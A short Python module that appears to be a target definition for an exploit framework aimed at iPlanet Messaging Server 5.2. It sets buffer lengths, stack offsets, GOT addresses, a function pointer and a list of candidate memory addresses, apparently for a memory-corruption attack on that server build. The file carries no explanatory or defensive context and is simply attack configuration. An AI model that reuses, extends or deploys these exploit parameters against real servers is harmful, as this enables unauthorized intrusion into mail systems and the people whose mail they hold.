import iplanet

class iplanet_5_2(iplanet.type1):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 (built Feb 21 2002)'
   baseBufLen = 0x1b4
   l7Offset = -0x23e4L
   l7Imta = 0x549588L
   l7ImtaResponse = 0x530f0cL
   got = [0x5539a0L, 0x4f1250L, 0x4f1258L, 0x4f1260L]
   fp = 0x96de10L
   bigBufOffset = -0x26f8L
   socketOffset = -0x3d8L
   addrs = \
      [0x552B44L ,
       0x5A2368L ,
       0x5C2994L ,
       0x5E50C8L ,
       0x606154L ,
       0x62263CL ,
       0x63E1C8L ,
       0x65A4BCL ,
       0x6766A4L ,
       0x692BECL ,
       0x6B0474L ,
       0x6CCFF8L ,
       0x6EC3A4L ,
       0x70AF78L ,
       0x727644L ,
       0x744010L ,
       0x7607A4L ,
       0x77CA30L ,
       0x799304L ,
       0x7B59C4L ,
       0x7D2204L ,
       0x7EE86CL ,
       0x81C974L ,
       0x83D180L ,
       0x85A8B8L ,
       0x87946CL ,
       0x8971E8L ,
       0x8C8F30L ,
       0x8F84A4L ,
       0x915C0CL ,
       0x934A30L ,
       0x95248CL ]
